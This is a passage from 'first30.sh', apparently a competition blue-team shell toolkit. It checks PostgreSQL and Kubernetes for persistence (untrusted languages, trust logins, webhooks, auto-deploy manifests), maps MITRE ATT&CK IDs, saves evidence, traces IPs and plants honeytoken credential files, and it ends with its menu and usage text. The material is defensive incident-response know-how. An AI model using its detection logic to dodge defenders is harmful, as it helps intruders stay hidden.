        dl=$(db_pg "select lanname from pg_language where not lanpltrusted and lanname not in ('internal','c','sql')" | tr '\n' ' ')
        [ -n "$dl" ] && do="$do
  untrusted languages are installed (they can run OS commands): $dl"
        dc=$(db_pg "select n.nspname||'.'||p.proname||' <- '||p.probin from pg_proc p join pg_namespace n on n.oid=p.pronamespace join pg_language l on l.oid=p.prolang where l.lanname='c' and p.probin is not null and p.probin not like '\$libdir/%'" | head -6)
        [ -n "$dc" ] && do="$do
  functions loaded from a library outside PostgreSQL's own folder:
$(say "$dc" | sed 's/^/      /')"
        dh=$(db_pg "show hba_file")
        [ -f "$dh" ] && dht=$(grep -n -E '^[[:space:]]*host.*[[:space:]]trust[[:space:]]*$' "$dh" | head -5) && [ -n "$dht" ] && do="$do
  $dh lets network logins in with NO password (trust):
$(say "$dht" | sed 's/^/      /')"
        dtn=$(db_pg "select tgrelid::regclass||'.'||tgname from pg_trigger where not tgisinternal union select 'event trigger '||evtname from pg_event_trigger" | v5_base pgtriggers | head -10)
        [ -n "$dtn" ] && do="$do
  PostgreSQL triggers that are new or gone since the first run:
$(say "$dtn" | sed 's/^/      /')"
    fi
    if [ -n "$do" ]; then
        say "$do" | sed '/^$/d'
        flag
        nxt "the app's own account is normal: check each name against the app's config (sh first30.sh findpass). Remove a rogue account: DROP USER 'name'@'host';   a trigger: DROP TRIGGER db.name;   Tell your lead first: the scored app may use it."
    else
        ok "no rogue admins, empty passwords, loaded libraries or file tricks"
    fi
}

# ---------------------------------------------------------------- Kubernetes: webhooks and auto-deploy folders
chk_k8s2() {
    { have kubectl || have k3s; } || return 0
    tmo k8s_cmd get namespaces >/dev/null 2>&1 || return 0
    sec k8s2 "Kubernetes: webhooks and auto-deploy folders (T1610, T1546)"
    kw=$( {
        tmo k8s_cmd get mutatingwebhookconfigurations,validatingwebhookconfigurations --no-headers -o custom-columns='K:.kind,N:.metadata.name,U:.webhooks[*].clientConfig.url,S:.webhooks[*].clientConfig.service.name' 2>/dev/null |
            awk '{print "webhook: " $1 " " $2 "  url=" $3 "  service=" $4}'
        for kd in /var/lib/rancher/k3s/server/manifests /var/lib/rancher/k3s/agent/pod-manifests /etc/kubernetes/manifests /var/lib/rancher/rke2/server/manifests; do
            [ -d "$kd" ] && for kf in "$kd"/*; do [ -f "$kf" ] && say "auto-deployed file: $kf $(sha256sum "$kf" | cut -c1-12)"; done
        done
    } )
    kn=$(say "$kw" | sed '/^$/d' | v5_base k8shooks)
    ku=$(say "$kw" | grep -E 'url=https?://' | grep -v 'url=<none>')
    if [ -n "$kn$ku" ]; then
        [ -n "$kn" ] && { say "  new, gone or changed since this script's first run here:"; say "$kn" | sed 's/^/    /'; }
        [ -n "$ku" ] && { say "  webhooks that send every new pod to a URL outside the cluster (they can rewrite it on the way):"; say "$ku" | sed 's/^/    /'; }
        flag
        nxt "a mutating webhook can add a backdoor container to every pod. A file in a manifests folder is re-created every time you delete its pod. Read it, save it (evidence), then: kubectl delete <kind> <name>  or delete the file."
    else
        ok "no new webhooks or auto-deploy files ($(say "$kw" | grep -c .) watched)"
    fi
}

# ---------------------------------------------------------------- report: facts for the packet and for an incident report
mitre_name() {
    awk -v id="$1" 'BEGIN { split("T1003=OS Credential Dumping|T1003.001=LSASS Memory|T1003.003=NTDS|T1003.006=DCSync|T1014=Rootkit|T1021.001=Remote Desktop Protocol|T1021.004=SSH|T1036.003=Rename Legitimate Utilities|T1036.004=Masquerade Task or Service|T1036.005=Match Legitimate Resource Name or Location|T1037=Boot or Logon Initialization Scripts|T1037.003=Network Logon Script|T1040=Network Sniffing|T1053=Scheduled Task/Job|T1053.003=Cron|T1053.005=Scheduled Task|T1053.007=Container Orchestration Job|T1055=Process Injection|T1056=Input Capture|T1059.001=PowerShell|T1059.004=Unix Shell|T1068=Exploitation for Privilege Escalation|T1070.002=Clear Linux or Mac System Logs|T1070.003=Clear Command History|T1070.004=File Deletion|T1070.006=Timestomp|T1071=Application Layer Protocol|T1071.001=Web Protocols|T1078=Valid Accounts|T1083=File and Directory Discovery|T1090=Proxy|T1095=Non-Application Layer Protocol|T1098=Account Manipulation|T1098.004=SSH Authorized Keys|T1105=Ingress Tool Transfer|T1110=Brute Force|T1110.003=Password Spraying|T1113=Screen Capture|T1136=Create Account|T1136.001=Local Account|T1136.002=Domain Account|T1190=Exploit Public-Facing Application|T1197=BITS Jobs|T1205.002=Socket Filters|T1219=Remote Access Tools|T1222.002=Linux and Mac File and Directory Permissions Modification|T1484.001=Group Policy Modification|T1486=Data Encrypted for Impact|T1505=Server Software Component|T1505.003=Web Shell|T1505.004=IIS Components|T1529=System Shutdown/Reboot|T1531=Account Access Removal|T1543=Create or Modify System Process|T1543.002=Systemd Service|T1543.003=Windows Service|T1546=Event Triggered Execution|T1546.003=Windows Management Instrumentation Event Subscription|T1546.004=Unix Shell Configuration Modification|T1546.013=PowerShell Profile|T1547=Boot or Logon Autostart Execution|T1547.001=Registry Run Keys / Startup Folder|T1548=Abuse Elevation Control Mechanism|T1548.003=Sudo and Sudo Caching|T1552=Unsecured Credentials|T1552.001=Credentials In Files|T1552.006=Group Policy Preferences|T1554=Compromise Host Software Binary|T1556=Modify Authentication Process|T1556.003=Pluggable Authentication Modules|T1557=Adversary-in-the-Middle|T1557.001=LLMNR/NBT-NS Poisoning and SMB Relay|T1558=Steal or Forge Kerberos Tickets|T1558.001=Golden Ticket|T1558.003=Kerberoasting|T1558.004=AS-REP Roasting|T1562.001=Disable or Modify Tools|T1562.002=Disable Windows Event Logging|T1562.006=Indicator Blocking|T1564=Hide Artifacts|T1564.001=Hidden Files and Directories|T1564.004=NTFS File Attributes|T1570=Lateral Tool Transfer|T1572=Protocol Tunneling|T1574=Hijack Execution Flow|T1574.006=Dynamic Linker Hijacking|T1610=Deploy Container|T1620=Reflective Code Loading|T1649=Steal or Forge Authentication Certificates", a, "|")
        for (i in a) { split(a[i], kv, "="); if (kv[1] == id) { print kv[2]; exit } } }'
}
do_report() {
    need_root
    rp="$VAULT/report_${HOST}_$TS.txt"
    {
        say "===== FACTS for $HOST  (copy what you need; your team writes the words) ====="
        say "Box:        $HOST     OS: $(os_name)     kernel: $(uname -r)"
        say "Time:       $(date -u '+%Y-%m-%d %H:%M:%S') UTC     local: $(date '+%Y-%m-%d %H:%M:%S %Z')"
        if [ -f "$BASE" ]; then say "Baseline:   seal $(seal "$BASE")   (must match the seal on your paper)"; else say "Baseline:   none yet (sh first30.sh recon)"; fi
        say ""
        say "--- Every address on this box (packet documentation) ---"
        ip_all | awk '{printf "  %-20s %-14s %s\n", $1, $2, substr($0, index($0, $3))}'
        if { have kubectl || have k3s; } && tmo k8s_cmd get namespaces >/dev/null 2>&1; then
            tmo k8s_cmd get svc -A --no-headers 2>/dev/null | awk '$3 == "LoadBalancer" || $3 == "NodePort" {print "  Kubernetes service " $1 "/" $2 " (" $3 "): external " $5 "  ports " $6}'
        fi
        have docker && docker ps --format '  container {{.Names}}: {{.Ports}}' 2>/dev/null | head -20
        say "  default gateway: $(ip route 2>/dev/null | awk '/^default/ {print $3; exit}')     DNS: $(awk '/^nameserver/ {printf "%s ", $2}' /etc/resolv.conf 2>/dev/null)"
        say ""
        say "--- Listening services (port, program, account) ---"
        listen_accounts 2>/dev/null | head -40
        say ""
        say "--- Evidence saved in the vault (proof for an incident report) ---"
        if [ -s "$VAULT/quarantine/evidence_log.txt" ]; then sed 's/^/  /' "$VAULT/quarantine/evidence_log.txt" | tail -60; else say "  none saved yet (sh first30.sh evidence <file>)"; fi
        say ""
        say "--- Addresses your team blocked, with first and last time each one appears in the logs ---"
        if [ -s "$VAULT/blocked.txt" ]; then
            while read -r rb_ip rb_rest; do
                [ -n "$rb_ip" ] || continue
                rb_l=$( { auth_log; cat /var/log/nginx/access.log /var/log/apache2/access.log /var/log/httpd/access_log 2>/dev/null; } | grep -F -w -- "${rb_ip%/*}" )
                rb_f=$(say "$rb_l" | sed -n '1p' | cut -c1-70); rb_z=$(say "$rb_l" | sed -n '$p' | cut -c1-70)
                say "  $rb_ip   blocked $rb_rest"
                [ -n "$rb_f" ] && { say "      first seen: $rb_f"; say "      last seen:  $rb_z"; }
            done < "$VAULT/blocked.txt"
        else say "  none"; fi
        say ""
        say "--- Findings from the latest hunt, with their MITRE ATT&CK technique ---"
        rh=$(ls -t "$VAULT"/hunt_"$HOST"_*.txt 2>/dev/null | grep -v _details | head -1)
        if [ -n "$rh" ]; then
            say "  (from $rh)"
            sed -n '/^SUMMARY:/,$p' "$rh" | grep '^  - ' | while read -r _ rf; do
                say "  * $rf"
                for ri in $(printf '%s\n' "$rf" | grep -o -E 'T[0-9]{4}(\.[0-9]{3})?' | sort -u); do
                    rn=$(mitre_name "$ri"); say "      $ri  ${rn:-(look the name up on attack.mitre.org)}"
                done
            done
        else say "  no hunt has been run yet (sh first30.sh hunt)"; fi
        say ""
        say "--- Your team's notes (what you changed, and when) ---"
        tail -25 "$NOTES" 2>/dev/null | sed 's/^/  /'
        say ""
        say "An incident report also needs, in your own words: how they got in, what was affected, what you did,"
        say "and how you stop it happening again. An AI must not write any part of it."
    } 2>/dev/null | sanitize | tee "$rp"
    chmod 600 "$rp" 2>/dev/null
    say ""
    say "Saved: $rp"
}

# ================================================================ end of v4 additions

# ---------------------------------------------------------------- notes
do_note() {
    need_root
    if [ -z "$*" ]; then
        say "Usage: sh first30.sh note \"what you did, and why\""
        exit 1
    fi
    printf '%s  %s  %s: %s\n' "$(now_utc)" "$HOST" "${SUDO_USER:-root}" "$*" >> "$NOTES"
    chmod 600 "$NOTES"
    say "Saved in $NOTES:"
    tail -n 1 "$NOTES" | sed 's/^/  /'
    say "The next hunt shows it next to the changes, so everyone knows this one was yours."
}

do_notes() {
    need_root
    if [ -s "$NOTES" ]; then sed 's/^/  /' "$NOTES"; else say "No notes yet. Write one: sh first30.sh note \"what you did\""; fi
}

do_nets() {
    need_root
    if [ "$#" -eq 0 ]; then
        if [ -s "$VAULT/ournets.txt" ]; then say "Your networks: $(cat "$VAULT/ournets.txt")"
        else say "No networks saved. Example: sh first30.sh nets 10.100.130.0/24 192.168.220.0/24"; fi
        return 0
    fi
    for n in "$@"; do valid_ip "$n" || { say "Not an IPv4 network: $n (example: 10.100.130.0/24)"; exit 1; }; done
    say "$*" > "$VAULT/ournets.txt"
    chmod 600 "$VAULT/ournets.txt"
    say "Saved. Addresses outside $* are now marked in hunt, c2 and the login check."
}

# ---------------------------------------------------------------- evidence
# Copy a suspicious file (or a running program, even one whose file was deleted)
# into the vault with its fingerprint and everything that uses it. The original is
# not touched. This is what you need for the incident report, before cleaning up.
do_evidence() {
    need_root
    ev=$1
    if [ -z "$ev" ]; then
        say "Usage: sh first30.sh evidence /full/path/to/file"
        say "   or: sh first30.sh evidence /proc/<pid>/exe   (a running program, even if its file was deleted)"
        exit 1
    fi
    qd="$VAULT/quarantine"
    mkdir -p "$qd" && chmod 700 "$qd"
    st=$(date -u +%Y%m%d-%H%M%S)
    case "$ev" in
        /proc/[0-9]*/exe)
            evp=${ev#/proc/}; evp=${evp%/exe}
            evr=$(readlink "$ev" 2>/dev/null) || { say "No such process: $evp"; exit 1; }
            src=$ev
            say "Process $evp runs: $evr" ;;
        *)
            if [ ! -e "$ev" ] && [ ! -L "$ev" ]; then say "Not found: $ev"; exit 1; fi
            evr=$(readlink -f "$ev" 2>/dev/null || echo "$ev")
            src=$evr ;;
    esac
    name=$(basename "${evr% (deleted)}")
    dest="$qd/${st}_${HOST}_$name.evidence"
    if [ -d "$src" ]; then
        dest="$dest.tgz"
        tar -czf "$dest" -C "$(dirname "$src")" "$name" 2>/dev/null
        h=$(sha256sum "$dest" | cut -d' ' -f1)
    else
        cat "$src" > "$dest" 2>/dev/null || { say "Could not read $src"; rm -f "$dest"; exit 1; }
        h=$(sha256sum "$dest" | cut -d' ' -f1)
    fi
    chmod 400 "$dest"
    {
        say "== Evidence saved $(now_utc) on $HOST"
        say "original : $evr"
        say "copy     : $dest   (it cannot run from there; the original was not touched)"
        say "sha256   : $h"
        [ -e "$src" ] && say "file     : $(ls -ld "$src" 2>/dev/null)"
        [ -e "${evr% (deleted)}" ] && say "times    : $(stat -c 'changed %z | modified %y' "${evr% (deleted)}" 2>/dev/null)"
        have file && say "type     : $(file -b "$dest" 2>/dev/null)"
        if [ -e "${evr% (deleted)}" ]; then
            from_package "${evr% (deleted)}"
            case $? in
                0) say "package  : $(pkg_owner "${evr% (deleted)}")" ;;
                1) say "package  : NONE (no package installed this file)" ;;
            esac
            [ -n "$(lsattr -d "${evr% (deleted)}" 2>/dev/null | awk '$1 ~ /[ia]/')" ] && say "locked   : yes (chattr +i or +a; unlock with chattr -i before removing)"
        fi
        say "running  :"
        proc_table
        awk -v f="${evr% (deleted)}" '{p = $1; $1 = ""; sub(/^ /, ""); sub(/ \(deleted\)$/, ""); if ($0 == f) print p}' "$PTAB" |
            while read -r p; do say "    pid $p ($(ps -o user=,args= -p "$p" 2>/dev/null))"; done
        say "open by  :"
        ls -l /proc/[0-9]*/fd 2>/dev/null | awk -v f="${evr% (deleted)}" '
            /^\/proc\/[0-9]+\/fd:$/ {p = $0; sub(/^\/proc\//, "", p); sub(/\/fd:$/, "", p); next}
            {n = length(f); if (substr($0, length($0) - n + 1) == f && index($0, " -> " f)) print "    pid " p}' | sort -u
        say "named in (services, cron, startup files):"
        grep -r -l -F -- "${evr% (deleted)}" /etc/systemd /lib/systemd/system /usr/lib/systemd/system /etc/cron* \
            /var/spool/cron /etc/rc.local /etc/init.d /etc/profile.d /etc/ld.so.preload /etc/environment \
            /etc/pam.d /etc/sudoers.d /root/.bashrc /root/.profile 2>/dev/null | sed 's/^/    /'
        say ""
    } | tee -a "$qd/evidence_log.txt"
    chmod 600 "$qd/evidence_log.txt"
    autonote "saved evidence: $evr (sha256 $(printf '%s' "$h" | cut -c1-16)...)"
    say "Next, with your lead:"
    say "  1. Write it down: the time, $HOST, the path, the sha256 above, and what it did (MITRE number)."
    say "  2. Stop what runs it: kill <pid>, or systemctl disable --now <service>."
    say "  3. Remove what starts it again (the service file, cron line or drop-in named above)."
    say "  4. Only then delete or move the original."
    say "The log of everything saved: $qd/evidence_log.txt"
}

# ---------------------------------------------------------------- trace
# Where has an address shown up on this box? Searches the logs for it, like the
# find_malicious_ip example in the threat-hunting guide, and gives the first and
# last time it was seen (what the incident report needs).
do_trace() {
    need_root
    tip=$1
    if ! valid_ip "$tip"; then say "Usage: sh first30.sh trace <IPv4 address>"; exit 1; fi
    say "== Where has $tip shown up on $HOST? (first seen and last seen, for the incident report)"
    tf=0
    for f in /var/log/auth.log /var/log/auth.log.1 /var/log/secure /var/log/secure-* /var/log/syslog /var/log/syslog.1 \
        /var/log/messages /var/log/messages-* /var/log/kern.log /var/log/ufw.log /var/log/audit/audit.log \
        /var/log/apache2/*.log /var/log/httpd/*log /var/log/nginx/*.log /var/log/mysql/*.log /var/log/mail.log /var/log/maillog; do
        [ -f "$f" ] || continue
        n=$(grep -c -F -w -- "$tip" "$f" 2>/dev/null)
        [ "${n:-0}" -gt 0 ] || continue
        tf=1
        say "  $f: $n lines"
        say "    first: $(grep -F -w -m 1 -- "$tip" "$f" | cut -c1-220)"
        say "    last:  $(grep -F -w -- "$tip" "$f" | tail -n 1 | cut -c1-220)"
    done
    if have journalctl; then
        jt="$VAULT/.trace.$$"
        journalctl --no-pager -q -b 2>/dev/null | grep -F -w -- "$tip" > "$jt"
        if [ -s "$jt" ]; then
            tf=1
            say "  the journal (this boot): $(wc -l < "$jt") lines"
            say "    first: $(head -n 1 "$jt" | cut -c1-220)"
            say "    last:  $(tail -n 1 "$jt" | cut -c1-220)"
        fi
        rm -f "$jt"
    fi
    [ "$tf" = 0 ] && say "  not in the logs (older logs ending in .gz are not searched: zgrep $tip /var/log/*.gz)"
    say "== Right now"
    rn=$( { if have ss; then ss -tnp; else netstat -tnp; fi; } 2>/dev/null | grep -F -w -- "$tip")
    if [ -n "$rn" ]; then say "$rn" | sed 's/^/  /'; else say "  no open connection with $tip"; fi
    if blocked_list | grep -q -x -F -- "$tip"; then say "  blocked: yes ($(grep -F -- "$tip" "$VAULT/blocked.txt" | head -1))"
    else say "  blocked: no. To block it: sh first30.sh block $tip"; fi
    say "Write it down: sh first30.sh note \"$tip: first seen ..., last seen ..., did ...\""
}

# ---------------------------------------------------------------- bait
# A honeytoken: a file that looks like it holds an old password. Nobody on your
# team ever opens it, so anyone who does is red team. auditd logs who opened it,
# and the made-up login name inside shows in the login log if they try it.
# Plant it BEFORE running auditd mode, so the watch goes in before the rules lock.
do_bait() {
    need_root
    bp=$1
    if [ -z "$bp" ]; then
        if [ -n "$BAIT" ]; then say "Bait planted: $BAIT (login name $BAITUSER)"; else
            say "Usage: sh first30.sh bait /root/<a believable name only your team knows>"
            say "   for example /root/db_backup_creds.txt or /opt/app/.old_admin_login"
        fi
        return 0
    fi
    case "$bp" in
        /root/*|/home/*|/opt/*|/srv/*|/var/backups/*) ;;
        *) say "Put the bait under /root, /home, /opt, /srv or /var/backups."
           say "This script reads /etc and /tmp itself, which would set the bait off."; exit 1 ;;
    esac
    case "$bp" in "$VAULT"/*|/root/.ssh/*|/home/*/.ssh/*) say "Not inside the vault or an .ssh folder. Pick another place."; exit 1 ;; esac
    if [ -n "$BAIT" ]; then say "A bait is already planted: $BAIT. One per box."; exit 1; fi
    if [ -e "$bp" ]; then say "$bp already exists. Pick a new file name."; exit 1; fi
    if [ ! -d "$(dirname "$bp")" ]; then say "The folder $(dirname "$bp") does not exist."; exit 1; fi
    bn=$(( $(date +%s) % 90 + 10 ))
    for bw in backup deploy report monitor sync; do
        bu="svc_$bw$bn"
        grep -q "^$bu:" /etc/passwd || break
    done
    bpw=$(od -An -tx1 -N 8 /dev/urandom 2>/dev/null | tr -d ' \n')
    {
        say "# old service login - moved to the vault, do not use"
        say "host=$HOST"
        say "user=$bu"
        say "password=${bpw:-Winter2026!x}"
    } > "$bp"
    chmod 644 "$bp"
    say "$bp $bu $(date -u +%Y-%m-%dT%H:%M)" > "$VAULT/bait.txt"
    chmod 600 "$VAULT/bait.txt"
    BAIT=$bp BAITUSER=$bu
    autonote "planted the bait (details in $VAULT/bait.txt)"
    say "Bait planted: $bp   (made-up login name inside: $bu)"
    if have auditctl && audit_running && [ "$(audit_enabled)" != 2 ]; then
        auditctl -w "$bp" -p rwa -k bait >/dev/null 2>&1 && say "auditd now logs anyone who opens it."
        say "Now lock auditd with the bait in its rules: sh first30.sh auditd"
    elif [ "$(audit_enabled 2>/dev/null)" = 2 ]; then
        say "auditd's rules are already locked, so opening the bait is NOT logged until a reboot."
        say "The bait login name still works: the hunt looks for it in the login log."
    else
        say "Next: sh first30.sh auditd   (it adds the bait to the audit rules, then locks them)"
    fi
    say "Never open the bait yourself. Do not tell anyone where it is outside your team."
}

# ---------------------------------------------------------------- menu
pause() {
    say ""
    say "Press Enter to go back to the menu."
    read -r _ || exit 0
}

ask() {   # ask "question" -> answer in $ANS
    say ""
    say "$1"
    read -r ANS || exit 0
}

menu_header() {
    say ""
    say "======================================================================"
    say "first30 on $HOST ($(grep '^PRETTY_NAME=' /etc/os-release 2>/dev/null | cut -d'"' -f2))   $(date '+%H:%M')"
    if [ -f "$BASE" ]; then
        say "Baseline: made $(date -r "$BASE" '+%H:%M'), seal $(seal "$BASE") (must match your paper)"
        if [ -f "$VAULT/.stamp_$HOST" ]; then
            mago=$(( ($(date +%s) - $(date -r "$VAULT/.stamp_$HOST" +%s)) / 60 ))
            mw='minutes'; [ "$mago" = 1 ] && mw='minute'
            if [ "$mago" -ge 30 ]; then say "Last hunt: $mago $mw ago  <- time to hunt (choice 2)"
            else say "Last hunt: $mago $mw ago"; fi
        else
            say "No hunt yet. Hunt every 30 minutes (choice 2)."
        fi
    else
        say "No baseline yet: start with choice 1."
    fi
    if [ -n "$OURNETS" ]; then say "Your networks: $OURNETS"; else say "Your networks: not set (choice N)"; fi
    if [ -n "$LEARN" ]; then lm='ON: each check shows the command behind it'; else lm='off'; fi
    say "Learn mode: $lm"
    mh_r=$(reminders_count)
    [ "$mh_r" -gt 0 ] 2>/dev/null && say "Reminders: $mh_r open (R). First: $(head -1 "$REMIND" 2>/dev/null | cut -c1-90)"
    [ -s "$VAULT/.ontrack" ] && say "Back on track: before the SOS you were doing: $(cut -d'|' -f2- "$VAULT/.ontrack" | cut -c1-80)"
    [ -s "$PROTECT" ] || say "Protected addresses: none yet. Add the scoring engine and Black Team box (P)."
    say "----------------------------------------------------------------------"
    say "  1  Start of game: inventory, baseline and backup   (read only; saves copies)"
    say "  2  Hunt: what changed? Run every 30 minutes         (read only)"
    say "  3  Find C2: programs calling out (takes 30 seconds) (read only)"
    say "  4  Trace an address: where has it shown up?        (read only)"
    say "  5  Save evidence: copy a suspicious file safely     (the original is not touched)"
    say "  6  Write a team note: what you changed and why"
    say "  7  Show the team notes"
    say "  8  Block an address, in and out                    CHANGES the firewall"
    say "  9  Unblock an address                              CHANGES the firewall"
    say " 10  Plant a bait file (do this before 12)           CHANGES: adds one file"
    say " 11  Stop terminal spam and screen reading           CHANGES permissions (wall, write, terminals)"
    say " 12  Turn on and lock auditd, the audit log          CHANGES the box (ask your lead)"
    say " 13  Turn off root login over SSH                    CHANGES sshd (ask your lead)"
    say " 14  Harden this box, one step at a time (each step asks first)  CHANGES (undo-harden puts it back)"
    say " 15  Known bugs: old versions and loose settings red team uses    (read only)"
    say " 16  Domain check: is AD / the DC the real problem?               (read only)"
    say " 17  AD rescue over LDAP: restore, enable, unlock domain users    CHANGES AD (each step asks)"
    say " 18  Kick someone off: end their session and block them          CHANGES"
    say " 19  Restore a file or folder from the start-of-game backup      CHANGES that file (bad copy saved)"
    say " 20  Find where a password is written down                      (read only)"
    say " 21  Incident facts for a report (your team writes the report)   (read only; saves a facts file)"
    say " 22  Tripwire ports: log anyone who scans this box               CHANGES the firewall (logs only)"
    say " 23  Shared plumbing: what breaks if you change a password    (read only; do this FIRST)"
    say " 24  Plant a decoy file (more bait; several allowed)         CHANGES: adds one file"
    say " 25  Fence in a service your team installed (lock-svc)       CHANGES that service (auto-undo if it fails)"
    say " 26  Scrub a leaked password out of the history files        CHANGES history files"
    say " 27  Put the saved firewall rules back                       CHANGES the firewall"
    say " 28  Report: every address, evidence, blocks and findings with MITRE IDs   (read only; saves a file)"
    say "  S  SOS: something is wrong RIGHT NOW (start here when unsure)"
    say "  E  Explain an error message"
    say "  R  Reminders: PCRs to file, reports to write, what you were doing"
    say "  P  Protect addresses that must never be blocked (scoring engine, Black Team box)"
    say "  U  Odd device? Scout it: what is this box, and what to check first"
    say "  N  Set your team's networks (from the packet)"
    say "  L  Learn mode on/off"
    say "  Q  Quit"
    say "Type a choice and press Enter:"
}

do_menu() {
    need_root
    [ -z "$LEARN" ] && LEARN=1
    [ "$LEARN" = 0 ] && LEARN=''
    while :; do
        menu_header
        read -r ch || exit 0
        case "$ch" in
            1) ( do_recon; say ""; do_backup ); pause ;;
            2) ( do_hunt ); pause ;;
            3) ( do_c2 ); pause ;;
            4) ask "Address to trace (like 10.197.114.55):"; ( do_trace "$ANS" ); pause ;;
            5) ask "Full path of the file, or /proc/<pid>/exe for a running program:"; ( do_evidence "$ANS" ); pause ;;
            6) ask "Type the note and press Enter (example: changed root password; removed /etc/sudoers.d/domain-users):"
               [ -n "$ANS" ] && ( do_note "$ANS" ); pause ;;
            7) ( do_notes ); pause ;;
            8) ask "Address to block (like 10.197.114.55). Never the scoring engine:"
               ba=$ANS
               ask "Block $ba in and out of $HOST? Type yes to go ahead:"
               [ "$ANS" = yes ] && ( do_block "$ba" ); pause ;;
            9) ask "Address to unblock:"; ba=$ANS
               ask "Unblock $ba? Type yes to go ahead:"
               [ "$ANS" = yes ] && ( do_unblock "$ba" ); pause ;;
            10) ask "Where should the bait go? A believable name only your team knows, like /root/db_backup_creds.txt:"
                [ -n "$ANS" ] && ( do_bait "$ANS" ); pause ;;
            11) say ""; say "This turns off wall and write (chmod 000), kills running ones, and makes terminals and console screens 600."
                ask "Type yes to go ahead:"
                [ "$ANS" = yes ] && ( do_quiet ); pause ;;
            12) say ""; say "This installs auditd if needed, writes its rules, and LOCKS them until a reboot."
                ask "Did your lead say yes? Type yes to go ahead:"
                [ "$ANS" = yes ] && ( do_auditd ); pause ;;
            13) say ""; say "This turns off root login over SSH. If SSH is scored and logs in as root, do NOT do this."
                ask "Did your lead say yes? Type yes to go ahead:"
                [ "$ANS" = yes ] && ( do_ssh ); pause ;;
            14) ( do_harden ); pause ;;
            15) ( do_bugs ); pause ;;
            16) ( do_domain ); pause ;;
            17) ( do_ad ); pause ;;
            18) ( do_kick ); pause ;;
            19) ( do_restore ); pause ;;
            20) ( do_findpass ); pause ;;
            21) ( do_facts ); pause ;;
            22) ask "Type on to start the tripwire, off to stop it, or Enter to see who touched it:"
                ( do_trip "$ANS" ); pause ;;
            23) ( do_plumbing ); pause ;;
            24) ask "Full path for the decoy (like /opt/app/.old_admin_login), or Enter to list them:"; dq=$ANS; dk=login
                [ -n "$dq" ] && { ask "Kind: type login (an old service login) or admin (a fake remote-admin config):"; [ "$ANS" = admin ] && dk=admin; }
                ( do_decoy "$dq" "$dk" ); pause ;;
            25) ask "Service to fence in (like forgejo-runner), or Enter for help:"; lq=$ANS; la=''
                [ -n "$lq" ] && { ask "Run it as which account? Enter keeps the account it has now:"; la=$ANS; }
                ( do_locksvc "$lq" "$la" ); pause ;;
            26) ( do_scrub ); pause ;;
            27) ( do_fwrestore ); pause ;;
            28) ( do_report ); pause ;;
            [Ss]) ( do_sos ); pause ;;
            [Ee]) ( do_why ); pause ;;
            [Rr]) ( do_reminders ); pause ;;
            [Pp]) ask "Addresses to protect from blocks (scoring engine, Black Team box), separated by spaces, or Enter to list:"
                  # shellcheck disable=SC2086
                  ( do_protect $ANS ); pause ;;
            [Uu]) ( do_scout ); pause ;;
            [Nn]) ask "Your team's networks from the packet, separated by spaces (like 10.100.130.0/24 192.168.220.0/24):"
                  if [ -n "$ANS" ]; then
                      # shellcheck disable=SC2086
                      ( do_nets $ANS ) && OURNETS=$(cat "$VAULT/ournets.txt" 2>/dev/null)
                  fi; pause ;;
            [Ll]) if [ -n "$LEARN" ]; then LEARN=''; else LEARN=1; fi ;;
            [Qq]) exit 0 ;;
            '') ;;
            *) say "Pick one of the choices in the list." ;;
        esac
    done
}

usage() {
    say "first30.sh - run it with no mode for the menu:  sudo sh first30.sh"
    say ""
    say "Usage: sh first30.sh MODE"
    say "  recon         inventory + baseline (read only)"
    say "  backup        tar of configs, web roots, homes, cron (skips what is missing)"
    say "  all           recon, then backup"
    say "  hunt          what changed since the last hunt, plus every check (run every 30 minutes)"
    say "  c2            programs calling out to a C2 server (watches for 30 seconds)"
    say "  trace IP      where an address shows up in the logs, first and last time"
    say "  evidence F    copy a suspicious file (or /proc/<pid>/exe) into the vault with its fingerprint"
    say "  note \"text\"   add a line to the team notes;  notes  shows them"
    say "  nets NETS     save your team's networks, like: nets 10.100.130.0/24 192.168.220.0/24"
    say "  block IP      cut an address off, in and out (no IP: put the saved blocks back)"
    say "  unblock IP    remove a block"
    say "  bait FILE     plant a bait file (before auditd)"
    say "  auditd        install (if needed), set up and lock auditd, the audit log"
    say "  ssh           turn off root login over SSH, with safety checks;  undo-ssh  puts it back"
    say "  quiet         stop terminal spam: wall and write off, terminals and console screens 600;  undo-quiet"
    say ""
    say "Added in v4:"
    say "  sos           something is wrong right now: walks you through it (menu S)"
    say "  why \"error\"   explain an error message and the next step"
    say "  harden        hardening, one step at a time, each step asks;  undo-harden"
    say "  bugs          known bugs: old versions and loose settings (read only)"
    say "  domain        is AD / the DC the real problem? (read only)"
    say "  ad            AD rescue over LDAP: restore, enable, unlock users, set passwords"
    say "  kick X        end a session (address, account or pts/N) and block the address"
    say "  restore PATH  put a file or folder back from the start-of-game backup"
    say "  findpass      find where a password is written down"
    say "  facts X       incident facts and proof for an address, account or file"
    say "  trip on|off   tripwire ports that log scanners (no option: who touched them)"
    say "  protect IPs   addresses block and kick must never touch;  unprotect IPs"
    say "  reminders     PCRs to file, reports to write, what you were doing"
    say "  scout         odd device or not Linux: what is it, and what to check first"
    say ""
    say "Added in v5:"
    say "  plumbing      what breaks if you change a password: Vault, Keycloak, LDAP binds, domain join (read only)"
    say "  decoy FILE [login|admin]   plant another bait file; the hunt reports when anyone reads it"
    say "  lock-svc SVC [ACCOUNT]     fence in a service your team installed;  undo-lock-svc SVC"
    say "  scrub         remove a leaked password from history files (change the password first)"
    say "  fw-restore    put back the firewall rules saved by the last backup"
    say "  report        one block for the packet and for incident reports: every address, evidence with"
    say "                fingerprints, blocked addresses, and the latest findings with MITRE ATT&CK names"
    say ""
    say "Learn mode for any mode: sh first30.sh learn hunt"
    say "Run it from your own machine so no copy sits on the box:  ssh root@<box> 'sh -s hunt' < first30.sh"
}

main() {
    case "$(uname -s 2>/dev/null)" in
        Linux) ;;
        *) case "$1" in scout|why|note|notes) ;; *)
            say "This is not Linux ($(uname -s 2>/dev/null)). The main checks need Linux, so here is scout mode,"
            say "the part that works on any device:"
            do_scout; return 0 ;; esac ;;
    esac
    case "$1" in
        learn) shift; LEARN=1; main "$@" ;;
        recon) do_recon ;;
        backup) do_backup ;;
        all) do_recon; say ""; do_backup ;;
        hunt) do_hunt ;;
        auditd) do_auditd ;;
        c2) do_c2 ;;
        block) shift; do_block "$@" ;;
        unblock) shift; do_unblock "$@" ;;
        ssh) do_ssh ;;
        undo-ssh) do_undo_ssh ;;
        quiet) do_quiet ;;
        undo-quiet) do_undo_quiet ;;
        note) shift; do_note "$*" ;;
        notes) do_notes ;;
        nets) shift; do_nets "$@" ;;
        evidence) shift; do_evidence "$1" ;;
